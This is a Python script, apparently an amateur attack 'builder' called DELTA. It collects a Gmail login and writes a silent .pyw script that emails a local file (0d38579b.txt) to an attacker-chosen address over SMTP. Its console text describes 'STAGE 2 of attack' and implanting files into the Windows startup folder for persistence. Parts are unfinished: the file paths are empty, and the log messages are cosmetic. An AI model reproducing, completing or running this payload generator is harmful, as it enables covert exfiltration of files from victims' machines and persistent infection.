import datetime
import os
import os.path
from os import path
import time
import getpass
import sys
import time
import sys
import socket
import time, sys
import shutil

hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
print(s.getsockname()[0])
s.close()

# print("\u001b[31mHello\u001b[0mWorld")

os.system('cls') #clear screen bug
now = datetime.datetime.now() #time
username = getpass.getuser()  #user

source = 'builder.pyw'
destination = '' #what ever file path

os.rename(source, destination)

ip_all = hostname + ' ' + IPAddr + ' '
hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)


BANNER = '''[Copyright, 2019 (C) Merlin Blue INC. Do NOT use for illegal purposes.]

  *******   ******** **       **********     **
 /**////** /**///// /**      /////**///     ****
 /**    /**/**      /**          /**       **//**
 /**    /**/******* /**          /**      **  //**
 /**    /**/**////  /**          /**     **********
 /**    ** /**      /**          /**    /**//////**
 /*******  /********/********    /**    /**     /**
 ///////   //////// ////////     //     //      //

'''

print(BANNER)
print(str(now) + ' ' + str(username) + ' INFO: Attempted launch of: ' + u"\033[1;31mlaunchall.py") #use colored text as well
time.sleep(0.2)
print('\u001b[0m' + str(now) + str(username) + ' INFO: Ended red color: true') #stop the red text on further codes
print(str(now) + ' Saved to: launch-logs.txt')

time_date = str(now) + ' ' + str(username) + ' '
time.sleep(0.2)
print(str(now) + ' ' + str(username) + ' Saved logs to:' + " launchlogs.txt") #red
time.sleep(0.2)
print(str(now) + str(username) + ' INFO: Ended red color: true\n\n')
time.sleep(3)


print('--[Merlin Blue INC. Copyright 2019 (C). DO NOT USE FOR ILLEGAL PURPOSES.]--')
send_email = input(u'\033[1;31m[?] Send email from? : ') #sendfrom
pass_word = input(u'\033[1;31m[?] Password for previous email? : ') #password
send_to = input(u'\033[1;31m[?] Send to which email? : ') #sent-to
subject_2 = input(u'\033[1;31m[?] Subject? : ') #subject
file_name2 = input(u'\033[1;31m[?] File Name? : ')


file_1 = open('send-email.pyw', 'w')
file_1.write('''

import email, smtplib, ssl

from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

subject = ''' +  '"' + subject_2 + '"' + '''
sender_email = ''' + '"' + ' ' + send_email + '"' '''
receiver_email = ''' + '"' + ' ' + send_to + '"' + '''
password = ''' + '"' + pass_word + '"' + '''

# Create a multipart message and set headers
message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject
filename = '0d38579b.txt'

# Open PDF file in binary mode
with open(filename, "rb") as attachment:
    # Add file as application/octet-stream
    # Email client can usually download this automatically as attachment
    part = MIMEBase("application", "octet-stream")
    part.set_payload(attachment.read())

# Encode file in ASCII characters to send by email
encoders.encode_base64(part)

# Add header as key/value pair to attachment part
part.add_header(
    "Content-Disposition",
    f"attachment; filename= {filename}",
)

# Add attachment to message and convert message to string
message.attach(part)
text = message.as_string()

# Log in to server using secure context and send email
context = ssl.create_default_context()
with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, text)

''') #end of file writing
file_1.close()

print('--[ BLACKOUT SOCKET: ' + ip_all + ']--\n')


print(u'\033[1;31m[127.0.0.1]:' + u'\033[1;31m' + str(time_date) + ' INFO: Successfully built object/filename: send-email.py')
time.sleep(0.2) #pause for sequence -->
print(u'\033[1;31m[127.0.0.1]:' + u'\033[1;31m' + str(time_date) + ' INFO: Successfully built object/filename: send-email.py')
time.sleep(0.3)
print(u'\033[1;31m[127.0.0.1]:' + u'\033[1;31m' + str(time_date) + ' Attempting to send email to email: ' + str(send_email))
time.sleep(0.2)
print(u'\033[1;31m[127.0.0.1]:' + u'\033[1;31m' + str(time_date) + ' Compiling context list...' + str(send_email))
time.sleep(0.3)
print(u'\033[1;31m''[127.0.0.1] Successfull Buffer request sending to host IP: ' + str(ip_all)) #set context color to blue, critical

#email send, recieve, subject list, everything
print('[127.0.0.1] ' + 'Saved to file.')
time.sleep(0.1)
print('[127.0.0.1] ' + 'Saved to file.')
time.sleep(0.4)
print('[127.0.0.1] ' + 'Saved to file.')
time.sleep(0.6)
exec(open("splash-screen.py").read())

print('[*] Compiled build successfully. STAGE 2 of attack now taking place...')
exec(open("splash-screen.py").read())
time.sleep(2)

print('--[STAGE 2 - DELTA]--\n')

print('[*] Compiling sequence for implanting using shutil to file...')
dir_path = os.path.dirname(os.path.realpath(__file__)) #find the current directory
print('[*] SHUTIL Installed in Python, current directory: ' + dir_path)

#send all files to shell:startup location
source = 'builder.pyw'
destination = '' #what ever file path -->
source = 'send-email.pyw'
destination = ''


time.sleep(3)
